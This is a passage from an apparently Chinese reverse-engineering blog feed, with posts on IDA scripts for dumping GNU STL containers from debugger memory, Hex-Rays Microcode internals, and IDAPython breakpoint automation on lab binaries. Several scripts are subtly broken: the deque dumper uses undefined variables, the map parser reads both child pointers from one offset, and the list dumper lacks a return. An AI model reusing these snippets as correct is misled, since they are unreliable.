class="params">addr</span>):</span><br><span class="line">    ELEMENT_SIZE = <span class="number">8</span></span><br><span class="line">    data_addr = []</span><br><span class="line">    vetor_base = idc.read_dbg_qword(addr + <span class="number">0x0</span>)</span><br><span class="line">    vetor_end = idc.read_dbg_qword(addr + <span class="number">0x8</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(vetor_base,vetor_end,ELEMENT_SIZE):</span><br><span class="line">        data_addr.append(i)</span><br><span class="line">    <span class="keyword">return</span> data_addr</span><br></pre></td></tr></table></figure><h2 id="std-list"><a href="#std-list" class="headerlink" title="std::list"></a>std::list</h2><ul><li>双向循环链表存储</li><li>头结构 + 节点结构</li><li>遍历长度可以用 size 字段确定</li></ul><p><img data-src="/./../images/image-20230120203453756.png" alt="image-20230120203453756"></p><p>内存布局：<img data-src="/./../images/image-20230120203507098.png" alt="image-20230120203507098"></p><p>IDA dump 脚本：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">dump_stl_list</span>(<span class="params">p_list_addr</span>):</span><br><span class="line">    data_addr = []</span><br><span class="line">    list_size = idc.read_dbg_qword(p_list_addr+<span class="number">0x10</span>)</span><br><span class="line">    cur_node = p_list_addr</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(list_size):</span><br><span class="line">        cur_node = idc.read_dbg_qword(cur_node + <span class="number">0x0</span>)</span><br><span class="line">        data_addr.append(cur_node + <span class="number">0x10</span>)</span><br></pre></td></tr></table></figure><h2 id="std-deque"><a href="#std-deque" class="headerlink" title="std::deque"></a>std::deque</h2><ul><li>头结构 + 迭代器结构</li><li>适用 std::deque &#x2F; std::stack</li></ul><p><img data-src="/./../images/image-20230120203905814.png" alt="image-20230120203905814"></p><ol><li>stl_deque.start.node 确定first map 项位置</li><li>stl_deque.start.last - stl_deque.start.first 确定缓冲区大小</li><li>stl_deque.finish.node 确定last map 项位置</li><li>对于每一个 map 项： <ol><li>start 项，解析 cur, last 区间</li><li>finish 项，解析 start, cur 区间</li><li>其余项，解析 start, last 区间</li></ol></li></ol><p>内存布局:<img data-src="/./../images/image-20230120203718899.png" alt="image-20230120203718899"></p><p>IDA dump 脚本:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">deque_iter = namedtuple(<span class="string">&#x27;deque_iter&#x27;</span>,[<span class="string">&#x27;cur&#x27;</span>,<span class="string">&#x27;first&#x27;</span>,<span class="string">&#x27;last&#x27;</span>,<span class="string">&#x27;node&#x27;</span>])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_iter</span>(<span class="params">addr</span>):</span><br><span class="line">    <span class="comment"># 解析队列迭代器</span></span><br><span class="line">    cur = idc.read_dbg_qword(addr + <span class="number">0x0</span>)</span><br><span class="line">    first = idc.read_dbg_qword(addr + <span class="number">0x8</span>)</span><br><span class="line">    last = idc.read_dbg_qword(addr + <span class="number">0x10</span>)</span><br><span class="line">    node = idc.read_dbg_qword(addr + <span class="number">0x18</span>)</span><br><span class="line">    <span class="keyword">return</span> deque_iter(cur,first,last,node)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump_deque</span>(<span class="params">addr</span>):</span><br><span class="line">    ELEMENT_SIZE = <span class="number">4</span>    <span class="comment"># std::deque&lt;xx&gt; xx 的类型大小来指定</span></span><br><span class="line">    data_addr = []</span><br><span class="line">    start_iter = parse_iter(addr + <span class="number">0x10</span>)</span><br><span class="line">    finish_iter = parse_iter(addr + <span class="number">0x30</span>)</span><br><span class="line">    buf_size = start_iter.last - start_iter.first</span><br><span class="line">    map_size = start_iter.node</span><br><span class="line">    map_finish = finish_iter.node</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解析第一个缓存数据</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start_iter.cur,start_iter.last,ELEMENT_SIZE):</span><br><span class="line">        data_addr.append(i)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解析最后一个缓存数据</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(finish_iter.first,finish_iter.cur,ELEMENT_SIZE):</span><br><span class="line">        data_addr.append(i)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解析中间缓存数据</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(map_start + <span class="number">8</span>,map_finish - <span class="number">8</span>,<span class="number">8</span>):</span><br><span class="line">        buf_start = idc.read_dbg_qword(b)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(buf_start,buf_start + buf_size, ELEMENT_SIZE):</span><br><span class="line">            data_addr.append(i)</span><br><span class="line">    <span class="keyword">return</span> data_addr</span><br></pre></td></tr></table></figure><h2 id="std-map"><a href="#std-map" class="headerlink" title="std::map"></a>std::map</h2><ul><li>底层采用 Rb-Tree 实现（红黑二叉树）</li><li>头结构 + 节点结构</li><li>用二叉树遍历可提取数据</li><li>适用 std::map &#x2F; std::set &#x2F; std::multimap &#x2F; std::multiset</li></ul><p>内存分布：<img data-src="/./../images/image-20230120204147238.png" alt="image-20230120204147238"></p><p>IDA dump 脚本：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">parse_gnu_map_header</span>(<span class="params">address</span>):</span><br><span class="line">    root = idc.read_dbg_qword(address + <span class="number">0x10</span>)</span><br><span class="line">    <span class="keyword">return</span> root</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_gnu_map_node</span>(<span class="params">address</span>):</span><br><span class="line">    left = idc.read_dbg_qword(address + <span class="number">0x10</span>)</span><br><span class="line">    right = idc.read_dbg_dword(address + <span class="number">0x10</span>)</span><br><span class="line">    data = address + <span class="number">0x20</span></span><br><span class="line">    <span class="keyword">return</span> left, right, data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_gnu_map_travel</span>(<span class="params">address</span>):</span><br><span class="line">    <span class="comment"># address &lt;—— std::map struct address</span></span><br><span class="line">    result = []</span><br><span class="line">    worklist = [parse_gnu_map_header(address)]</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(worklist) &gt; <span class="number">0</span>:</span><br><span class="line">        addr = worklist.pop()</span><br><span class="line">        (left, right, data) = parse_gnu_map_node(addr)</span><br><span class="line">        <span class="keyword">if</span> left &gt; <span class="number">0</span>: worklist.append(left)</span><br><span class="line">        <span class="keyword">if</span> right &gt; <span class="number">0</span>: worklist.append(right)</span><br><span class="line">        result.append(data)</span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><h2 id="std-unsorted-map"><a href="#std-unsorted-map" class="headerlink" title="std::unsorted_map"></a>std::unsorted_map</h2><ul><li>底层采用 HashTable 实现</li><li>头结构 + Bucket 数组 + 节点结构</li><li><strong>所有节点结构用单链表串联（****dump</strong> <strong>只需要遍历单链表）</strong></li><li><strong>头结构的第三个字段为单链表头</strong></li><li><strong>适用</strong> **std::**<strong>unsorted_map</strong> **&#x2F; std::**<strong>unsorted_set</strong> <strong>&#x2F; …</strong></li></ul><p>内存布局:<img data-src="/./../images/image-20230120204319472.png" alt="image-20230120204319472"></p><p>IDA dump 脚本:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">dump_stl_hashmap</span>(<span class="params">addr</span>):</span><br><span class="line">    <span class="comment"># dump stl hashmap gnu c++ x64</span></span><br><span class="line">    data_addr = []</span><br><span class="line">    bucket_addr = idc.read_dbg_qword(addr + <span class="number">0x10</span>)</span><br><span class="line">    node_addr = bucket_addr</span><br><span class="line">    <span class="keyword">while</span> node_addr != <span class="number">0</span>:</span><br><span class="line">        data_addr.append(node_addr + <span class="number">0x8</span>)</span><br><span class="line">        node_addr = idc.read_dbg_qword(node_addr)</span><br><span class="line">    <span class="keyword">return</span> data_addr</span><br></pre></td></tr></table></figure><h2 id="std-shared-ptr"><a href="#std-shared-ptr" class="headerlink" title="std::shared_ptr"></a>std::shared_ptr</h2><p>第一个指针就是数据指针</p><p>内存布局：<img data-src="/./../images/image-20230120204555397.png" alt="image-20230120204555397"></p><hr><h1 id="实战部分"><a href="#实战部分" class="headerlink" title="实战部分"></a>实战部分</h1>]]></content>
    
    
    <summary type="html">&lt;p&gt;c++ STL&lt;/p&gt;</summary>
    
    
    
    <category term="re" scheme="https://pa1r0t.github.io/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>Microcode</title>
    <link href="https://pa1r0t.github.io/2023/01/19/Microcode/"/>
    <id>https://pa1r0t.github.io/2023/01/19/Microcode/</id>
    <published>2023-01-19T14:09:48.000Z</published>
    <updated>2023-01-21T05:43:58.826Z</updated>
    
    <content type="html"><![CDATA[<p>记录Microcode </p><span id="more"></span><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>Microcode 是 hexrays 内部采用的介于机器代码与伪代码之间的一种中间表示语言(IR)。</p><p>Microcode 生成完成后，IDA 在 Microcode 的基础上生成 CTree。 CTree 是 IDA 内部用于表示 C语言伪代码的抽象语法树，IDA 也提供了大量 API 操作 CTree，可以实现一下伪代码展示方面的优化，例如删除某些节点等等。</p><p>Microcode 指令格式</p><p>opcode left, right, destination<br>一般来说有三个操作数，有一些指令可能缺少某个操作数，destination 也不一定会被修改（Store 指令）</p><p>Microcode 中常见的数据结构</p><p>函数是 IDA 中最大的汇编结果表示单位</p><p>函数 → 基本块 → 指令 → 操作数</p><p>Microcode 可视化插件</p><p><a href="https://github.com/gaasedelen/lucid">https://github.com/gaasedelen/lucid</a></p><p>Ctree 可视化插件<br><a href="https://github.com/patois/HRDevHelper">https://github.com/patois/HRDevHelper</a></p><p>Microcode生成过程：</p><ol><li><p>生成 Microcode</p></li><li><p>变换 Microcode （例如优化）</p></li><li><p>局部变量分配</p></li><li><p>生成 CTree （CTree 是 IDA 用来表示伪代码的抽象语法树 AST）</p></li><li><p>优化 CTree</p></li><li><p>输出 CTree</p></li></ol><p>Microcode 寄存器</p><p>microcode 的寄存器没有数量限制，物理寄存器往往会被直接映射到 microcode 寄存器，例如</p><ul><li>AL   is mapped into al.1 (mreg number 8)</li><li>AH  is mapped into ah.1 (mreg number 9)</li><li>EAX is mapped into eax.4 (mreg numbers 8-11)</li><li>RSI  is mapped into rsi.8</li></ul><p>Microcode 分阶段生成, 最初阶段生成的代码非常冗余</p><p><img data-src="/./../images/image-20230119221600205.png" alt="image-20230119221600205"></p><p>Microcode 快速上手，手动调用 microcode 生成</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ida_hexrays</span><br><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_microcode</span>(<span class="params">func_ea</span>):</span><br><span class="line">    maturity = ida_hexrays.MMAT_GLBOPT3</span><br><span class="line">    <span class="comment">#   maturity:</span></span><br><span class="line">    <span class="comment">#   MMAT_ZERO,          //&lt; microcode 不存在</span></span><br><span class="line">    <span class="comment">#   MMAT_GENERATED      //&lt; 已经生成的microcode</span></span><br><span class="line">    <span class="comment">#   MMAT_PREOPTIMIED    //&lt; 预先优化的pass已完成</span></span><br><span class="line">    <span class="comment">#   MMAT_LOCOPT         //&lt; local 本地每个基本块的优化已完成    control控制流图也就绪</span></span><br><span class="line">    <span class="comment">#   MMAT_CALLS          //&lt; 检测调用参数</span></span><br><span class="line">    <span class="comment">#   MMAT_GLBOPT1        //&lt; 执行第一个全局优化pass</span></span><br><span class="line">    <span class="comment">#   MMAT_GLBOPT2        //&lt; 大多数全局优化pass已完成</span></span><br><span class="line">    <span class="comment">#   MMAT_GLBOPT3        //&lt; 完成所有的优化，microcode被修改</span></span><br><span class="line">    <span class="comment">#   MMAT_LVAR3          //&lt; 分配所有的局部变量</span></span><br><span class="line">    hf = ida_hexrays.hexrays_failure_t()</span><br><span class="line">    pfn = idaapi.get_func(func_ea)</span><br><span class="line">    rng = ida_hexrays.mba_ranges_t(pfn)</span><br><span class="line">    mba = ida_hexrays.gen_microcode(rng,hf,<span class="literal">None</span>,</span><br><span class="line">                                    ida_hexrays.DECOMP_WARNINGS,maturity)</span><br><span class="line">    vp = ida_hexrays.vd_printer_t()</span><br><span class="line">    mba._<span class="built_in">print</span>(vp)</span><br><span class="line">print_microcode(<span class="number">0x1229</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Microcode 相关的数据结构，定义在 hexrays.hpp 文件 </p><p><img data-src="/./../images/image-20230119221901715.png" alt="image-20230119221901715"></p><p><img data-src="/./../images/image-20230119222011500.png" alt="image-20230119222011500"></p><p>Microcode 相关的数据结构: <strong>mbl_array_t</strong>,这个结构用来存放函数的基本块信息</p><ul><li>基本块之间使用双向链表链接</li><li>基本块数组存放在 natural 数组</li></ul><p><img data-src="/./../images/image-20230119222056330.png" alt="image-20230119222056330"></p><p>Microcode 相关的数据结构: mblock_t,这个结构用来描述基本块信息。±基本块内的指令与指令之间使用双向链表链接</p><p><img data-src="/./../images/image-20230119222156151.png" alt="image-20230119222156151"></p><p>Microcode 相关的数据结构: minsn_t。用于描述指令信息的结构。（注意微码指令支持指令嵌套。）</p><p><img data-src="/./../images/image-20230119222222555.png" alt="image-20230119222222555"></p><p>Microcode 相关的数据结构: mop_t</p><p>用于描述操作数信息的结构，指令 minsn_t 有 0 ~ 3 个操作数，分别时 l (left), r (right), d (destination) 操作数的类型用 mop_t 来表示</p><p><img data-src="/./../images/image-20230119222252600.png" alt="image-20230119222252600"></p><p>Microcode 插件例子</p><ul><li>实现 svc 0x900001 与 svc 0x9000F8 指令反编译成一条 call 指令</li><li>install_microcode_filter 注册 microcode filter 实现拦截指令翻译</li><li>microcode filter 是一种可以拦截 microcode 指令生成的机制，开发者需要继承 microcode_filter_t 类并实现 match 与 apply 两个函数。 </li><li>ida 在生成某一条指令的 microcode 之前会调用所有已经注册的 filter 的 match 函数，若 match 函数返回 True，则调用对应的 apply 函数实现指令替换。</li><li>我们需要将 svc 指令替换成 call 指令，ida 已经为我们实现了替换类 udc_filter_t, 这个类继承于 microcode_filter_t 并实现了 apply 方法（即替换call指令），我们需要继承 udc_filter_t 并实现它的 match 方法用于判断拦截的指令。</li></ul><p>Microcode 插件例子</p><p><img data-src="/./../images/image-20230119222437041.png" alt="image-20230119222437041"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;记录Microcode &lt;/p&gt;</summary>
    
    
    
    <category term="re" scheme="https://pa1r0t.github.io/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>IDAPython</title>
    <link href="https://pa1r0t.github.io/2023/01/19/IDAPython/"/>
    <id>https://pa1r0t.github.io/2023/01/19/IDAPython/</id>
    <published>2023-01-19T09:52:02.000Z</published>
    <updated>2023-01-19T10:41:38.027Z</updated>
    
    <content type="html"><![CDATA[<p>记录ida脚本</p><span id="more"></span><h2 id="IDA-Python-脚本编程"><a href="#IDA-Python-脚本编程" class="headerlink" title="IDA Python 脚本编程"></a>IDA Python 脚本编程</h2><p>内存分为：</p><ul><li>本地内存</li><li>调试内存</li></ul><h3 id="常用脚本接口介绍"><a href="#常用脚本接口介绍" class="headerlink" title="常用脚本接口介绍"></a>常用脚本接口介绍</h3><p>寄存器操作（调试）</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">idc.get_reg_value(<span class="string">&#x27;rax’)</span></span><br><span class="line"><span class="string">idaapi.set_reg_val(&quot;rax&quot;, 1234)</span></span><br></pre></td></tr></table></figure><p>读取 xmm 寄存器</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">read_xmm_reg</span>(<span class="params">name</span>):</span><br><span class="line">    rv = idaapi.regval_t()</span><br><span class="line">    idaapi.get_reg_val(name,rv)</span><br><span class="line">    <span class="keyword">return</span> (struct.unpack(<span class="string">&quot;Q&quot;</span>,rv.<span class="built_in">bytes</span>())[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><p>调试内存操作dbg 是指debug内存（调试内存）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">idc.read_dbg_byte(addr)</span><br><span class="line">idc.read_dbg_word(addr)</span><br><span class="line">idc.read_dbg_dword(addr)</span><br><span class="line">idc.read_dbg_qword(addr)</span><br><span class="line">idc.read_dbg_memory(addr,size)</span><br><span class="line">idc.patch_dbg_byte(addr,val)</span><br></pre></td></tr></table></figure><p>调试内存读写封装</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">patch_dbg_mem</span>(<span class="params">addr,data</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">        idc.patch_dbg_byte(addr+i,data[i])</span><br><span class="line">        </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_dbg_mem</span>(<span class="params">addr,size</span>):</span><br><span class="line">    dd = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(size):</span><br><span class="line">        dd.append(idc.read_dbg_byte(addr+i))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(dd)</span><br></pre></td></tr></table></figure><p>本地内存操作（会修改idb数据库）</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">idc.get_qword(addr)</span><br><span class="line">idc.patch_qword(addr,val)</span><br><span class="line">idc.patch_dword(addr,val)</span><br><span class="line">idc.patch_word(addr,val)</span><br><span class="line">idc.patch_byte(addr,val)</span><br><span class="line">idc.get_bytes(addr,size)</span><br></pre></td></tr></table></figure><p>反汇编操作</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">idc.GetDisasm(addr) <span class="comment"># 只能返回一条汇编指令</span></span><br><span class="line">idc.next_head(addr) <span class="comment"># 获取下一条汇编指令的地址</span></span><br></pre></td></tr></table></figure><p>交叉引用分析</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ref <span class="keyword">in</span> idautils.XrefsTo(ea):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(ref.frm))</span><br></pre></td></tr></table></figure><p>杂项常用接口</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">idc.add_bpt(addr) <span class="comment"># 添加断点</span></span><br><span class="line">idaapi.get_imagebase() <span class="comment"># 获取基地址</span></span><br><span class="line">idc.create_insn(addr) <span class="comment"># 生成汇编指令，相当于快捷键C 常用于固件分析</span></span><br><span class="line">ida_funcs.add_func(addr) <span class="comment"># 生成函数，相当于快捷键p</span></span><br><span class="line">ida_bytes.create_strlit(addr) <span class="comment"># 生成字符串，相当于快捷键A</span></span><br></pre></td></tr></table></figure><p>函数遍历</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> func <span class="keyword">in</span> idautils.Functions():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;0x%x,%s&quot;</span> % (func,idc.get_func_name(func)))</span><br></pre></td></tr></table></figure><p>基本块的遍历</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">fn = 目标函数地址</span><br><span class="line">f_blocks = idaapi.FlowChart(idaapi.get_func(fn),flags=idaapi.FC_PREDS)</span><br><span class="line"><span class="keyword">for</span> blocks <span class="keyword">in</span> f_blocks:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(blocks.start_ea))</span><br><span class="line">    <span class="comment"># 基本块的前驱</span></span><br><span class="line">    <span class="keyword">for</span> pre <span class="keyword">in</span> blocks.preds():</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(pre.start_ea))</span><br><span class="line">    <span class="comment"># 基本块的后继</span></span><br><span class="line">    <span class="keyword">for</span> sucess <span class="keyword">in</span> blocks.succs():</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(sucess.start_ea))</span><br></pre></td></tr></table></figure><p>指令遍历</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ins <span class="keyword">in</span> idautils.FuncItems(addr):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(ins))</span><br></pre></td></tr></table></figure><h3 id="实战部分"><a href="#实战部分" class="headerlink" title="实战部分"></a>实战部分</h3><p>ollvm批量断点设置：</p><p>实验材料：ollvm-flat</p><p>注意：<strong>判断真实块的依据是查找</strong> <strong>ollvm</strong> <strong>汇集点基本块的交叉引用，不一定准确</strong></p><p>断点脚本：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"></span><br><span class="line"><span class="comment"># ollvm函数地址</span></span><br><span class="line">fn = <span class="number">0x401F60</span></span><br><span class="line"><span class="comment"># ollvm基本块汇集地址</span></span><br><span class="line">ollvm_tail = <span class="number">0x405D4B</span></span><br><span class="line"><span class="comment"># 拿到函数基本块的迭代器</span></span><br><span class="line">f_blocks = idaapi.FlowChart(idaapi.get_func(fn),flags=idaapi.FC_PREDS)</span><br><span class="line"><span class="comment"># 然后遍历函数基本块</span></span><br><span class="line"><span class="keyword">for</span> block <span class="keyword">in</span> f_blocks:</span><br><span class="line">    <span class="comment"># 拿到每个基本块的后驱</span></span><br><span class="line">    <span class="keyword">for</span> sucess <span class="keyword">in</span> block.succs():</span><br><span class="line">        <span class="keyword">if</span> sucess.start_ea == ollvm_tail:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">hex</span>(block.start_ea))</span><br><span class="line">            idc.add_bpt(block.start_ea)</span><br></pre></td></tr></table></figure><p>复制到ida下面，摁回车两次就行</p><p><img data-src="/./../images/image-20230119182419401.png" alt="image-20230119182419401"></p><p>成功打上断点，打上断点的基本块都是真实块</p><p><img data-src="/./../images/image-20230119182530944.png" alt="image-20230119182530944"></p><p>断点管理</p><p><img data-src="/./../images/image-20230119182636581.png" alt="image-20230119182636581"></p><p>全选右键生成文件夹</p><p><img data-src="/./../images/image-20230119182727613.png" alt="image-20230119182727613"></p><p>点击文件夹，进行断点的批量禁用或启用</p><p><img data-src="/./../images/image-20230119182906812.png" alt="image-20230119182906812"></p><p>条件断点脚本编写：</p><p>实验材料：dump_test.exe</p><p>目标：设置一个条件断点，当 rand 函数返回值为 16949 时停下</p><p>找到random函数</p><p><img data-src="/./../images/image-20230119183303757.png" alt="image-20230119183303757"></p><p>设置断点</p><p><img data-src="/./../images/image-20230119183327074.png" alt="image-20230119183327074"></p><p>在断点处右键编辑断点</p><p><img data-src="/./../images/image-20230119183413079.png" alt="image-20230119183413079"></p><p>脚本：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bp</span>():</span><br><span class="line">    rax = idc.get_reg_value(<span class="string">&#x27;rax&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> rax == <span class="number">16949</span></span><br></pre></td></tr></table></figure><p>先在ida中执行脚本</p><p>然后编辑断点，增加condition条件</p><p><img data-src="/./../images/image-20230119183620480.png" alt="image-20230119183620480"></p><p>然后运行程序</p><p>程序停下来后，就查看rax寄存器，经过16进制转10进制，结果正确</p><p><img data-src="/./../images/image-20230119183829577.png" alt="image-20230119183829577"></p><p>条件断点运用：dump rand 函数每一次执行结果，不让程序停下来</p><p>脚本：条件断点函数返回 False，IDA 不会命中该断点,利用这个特性提取运行时数据</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">bp</span>():</span><br><span class="line">    rax = idc.get_reg_value(<span class="string">&#x27;rax&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(rax,end=<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;记录ida脚本&lt;/p&gt;</summary>
    
    
    
    <category term="re" scheme="https://pa1r0t.github.io/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>hgame2023</title>
    <link href="https://pa1r0t.github.io/2023/01/14/hgame2023/"/>
    <id>https://pa1r0t.github.io/2023/01/14/hgame2023/</id>
    <published>2023-01-14T02:09:49.000Z</published>
    <updated>2023-02-14T02:36:57.723Z</updated>
    
